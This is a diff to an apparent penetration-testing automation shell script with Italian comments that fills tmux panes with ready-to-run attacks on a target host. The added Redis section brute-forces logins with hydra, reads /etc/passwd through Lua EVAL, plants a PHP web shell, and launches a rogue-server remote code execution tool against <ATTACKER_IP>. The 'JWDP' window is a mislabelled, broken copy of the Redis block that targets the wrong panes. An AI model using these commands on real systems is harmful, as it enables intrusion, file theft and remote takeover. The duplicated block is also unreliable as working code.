@@ -315,6 +315,17 @@ else
 	pip install droopescan
 fi
 
+# JDWP
+printf "\n===================================\n"
+program="jdwp-shellifier"
+cd /opt
+if [ -d "/opt/jdwp-shellifier" ]; then
+	echo "[i] $program is already installed."
+else
+	echo "[->] Installing $program..."	
+	cd /opt
+	sudo sudo git clone https://github.com/IOActive/jdwp-shellifier.git
+fi
 
 printf "\n===================================\n"
 program="cupp"
@@ -2801,7 +2812,7 @@ tmux send-keys -t PT:31.6 "sqlplus USER/PASS@$ip:1521 as sysdba"
 cd $folderProject
 
 cd $folderProjectAuthN
-# SNMP
+# WinRM
 tmux new-window -t PT:32 -n '[5985,5986] WinRM'
 tmux split-window -v -t PT:32.0
 tmux split-window -v -t PT:32.1
@@ -2832,6 +2843,65 @@ tmux send-keys -t PT:32.7 "printf \"\n# WinRM: script for Active Directory Enume
 tmux send-keys -t PT:32.7 "evil-winrm -i $ip -u USER -p PASS -s /opt/evil-winrm/PowerSploit/Recon/" 
 cd $folderProject
 
+cd $folderProjectAuthN
+# REDIS
+tmux new-window -t PT:33 -n '[5985,5986] WinRM'
+tmux split-window -v -t PT:33.0
+tmux resize-pane -t PT:33.0 -y 3
+tmux split-window -v -t PT:33.1
+tmux select-pane -t "33.1"
+tmux split-window -h -t "33.1"
+tmux split-window -v -t PT:33.3
+tmux split-window -v -t PT:33.4
+tmux select-pane -t "33.4"
+tmux split-window -h -t "33.4"
+tmux split-window -v -t PT:33.6
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:33.0 "# REDIS: brute force" Enter
+tmux send-keys -t PT:33.0 "hydra -L users.txt -P passwords.txt $ip winrm && hydra -L users.txt -P users.txt $ip winrm && hydra -l '' -p '' $ip winrm && hydra -l 'dontknow' -p '' $ip winrm"
+tmux send-keys -t PT:33.1 "# REDIS: Access DB" Enter
+tmux send-keys -t PT:33.1 "redis-cli -h $ip -p 6379 -a USER@PASS"
+tmux send-keys -t PT:33.2 "# REDIS: Access DB with TLS" Enter
+tmux send-keys -t PT:33.2 "redis-cli -h $ip -p 6379 -a USER@PASS --tls --cacert certificato.pem"
+tmux send-keys -t PT:33.3 "printf \"\n# REDIS: Information Exposure\n# Get all keys available\n > KEYS *\n# Get a value related to a specific key\n > GET chiave1\n# Get all values related to a spcific key\n > hgetall chiave1\n# Execute Remote Command\n > system.exec \"whoami\"\n# Print a message\n > echo \"messaggio\"\n# Set a new key-value field\n > set key value\n# Set a new key-value field and delete it after 60 seconds\n > set key value EX 60 \n# Make another server slave\n > slaveof\n# Get all information about REDIS service (e.g. version)\n > info\n\n\" " Enter
+tmux send-keys -t PT:33.3 "redis-cli -h $ip -p 6379 -a USER@PASS"
+tmux send-keys -t PT:33.4 "# REDIS: Read a file" Enter
+tmux send-keys -t PT:33.4 "redis-cli EVAL \"local f = io.open('/etc/passwd', 'r'); local content = f:read('*a'); redis.call('SET', 'passwd_content', content); f:close()\" 0"
+tmux send-keys -t PT:33.5 "# REDIS: Write a file" Enter
+tmux send-keys -t PT:33.5 "redis-cli EVAL \"local f = io.open('/var/www/html/shell.php', 'w'); f:write('<?php system($_GET[\"cmd\"]); ?>'); f:close()\" 0"
+tmux send-keys -t PT:33.6 "# REDIS: Remote Code Execution" Enter
+tmux send-keys -t PT:33.6 "sudo python3 redis-rogue-server.py --rhost $ip --rport 6379 --lhost <ATTACKER_IP> --lport 21000"
+cd $folderProject
+
+cd $folderProjectAuthN
+# JWDP
+tmux new-window -t PT:34 -n '[5005, 8000] JWDP'
+tmux split-window -v -t PT:34.0
+tmux resize-pane -t PT:33.0 -y 3
+tmux split-window -v -t PT:33.1
+tmux select-pane -t "33.1"
+tmux split-window -h -t "33.1"
+tmux split-window -v -t PT:33.3
+tmux split-window -v -t PT:33.4
+tmux select-pane -t "33.4"
+tmux split-window -h -t "33.4"
+tmux split-window -v -t PT:33.6
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:33.0 "# REDIS: brute force" Enter
+tmux send-keys -t PT:33.0 "hydra -L users.txt -P passwords.txt $ip winrm && hydra -L users.txt -P users.txt $ip winrm && hydra -l '' -p '' $ip winrm && hydra -l 'dontknow' -p '' $ip winrm"
+tmux send-keys -t PT:33.1 "# REDIS: Access DB" Enter
+tmux send-keys -t PT:33.1 "redis-cli -h $ip -p 6379 -a USER@PASS"
+tmux send-keys -t PT:33.2 "# REDIS: Access DB with TLS" Enter
+tmux send-keys -t PT:33.2 "redis-cli -h $ip -p 6379 -a USER@PASS --tls --cacert certificato.pem"
+tmux send-keys -t PT:33.3 "printf \"\n# REDIS: Information Exposure\n# Get all keys available\n > KEYS *\n# Get a value related to a specific key\n > GET chiave1\n# Get all values related to a spcific key\n > hgetall chiave1\n# Execute Remote Command\n > system.exec \"whoami\"\n# Print a message\n > echo \"messaggio\"\n# Set a new key-value field\n > set key value\n# Set a new key-value field and delete it after 60 seconds\n > set key value EX 60 \n# Make another server slave\n > slaveof\n# Get all information about REDIS service (e.g. version)\n > info\n\n\" " Enter
+tmux send-keys -t PT:33.3 "redis-cli -h $ip -p 6379 -a USER@PASS"
+tmux send-keys -t PT:33.4 "# REDIS: Read a file" Enter
+tmux send-keys -t PT:33.4 "redis-cli EVAL \"local f = io.open('/etc/passwd', 'r'); local content = f:read('*a'); redis.call('SET', 'passwd_content', content); f:close()\" 0"
+tmux send-keys -t PT:33.5 "# REDIS: Write a file" Enter
+tmux send-keys -t PT:33.5 "redis-cli EVAL \"local f = io.open('/var/www/html/shell.php', 'w'); f:write('<?php system($_GET[\"cmd\"]); ?>'); f:close()\" 0"
+tmux send-keys -t PT:33.6 "# REDIS: Remote Code Execution" Enter
+tmux send-keys -t PT:33.6 "sudo python3 redis-rogue-server.py --rhost $ip --rport 6379 --lhost <ATTACKER_IP> --lport 21000"
+cd $folderProject
 
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
